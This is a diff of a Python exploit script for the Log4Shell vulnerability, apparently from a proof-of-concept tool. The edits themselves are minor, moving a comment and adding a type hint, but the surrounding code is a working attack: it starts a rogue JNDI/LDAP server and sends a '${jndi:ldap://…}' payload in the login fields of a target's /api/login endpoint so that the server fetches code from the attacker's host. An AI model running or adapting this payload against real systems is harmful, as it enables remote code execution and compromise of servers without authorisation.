@@ -85,8 +85,8 @@ def start_rouge_jndi(args: argparse.Namespace) -> None:
 def send_payload(args: argparse.Namespace) -> None:
     payload = f"${{jndi:ldap://{args.ip}:1389/o=tomcat}}"
 
-    # Pass payload in multiple fields because it changes based on version
     print("Sending payload")
+    # Pass payload in multiple fields because it changes based on version
     requests.post(
         f"{args.url}/api/login",
         json={
@@ -99,7 +99,7 @@ def send_payload(args: argparse.Namespace) -> None:
     )
 
 
-def main():
+def main() -> None:
     urllib3.disable_warnings()
     args = parse_args()
     start_rouge_jndi(args)
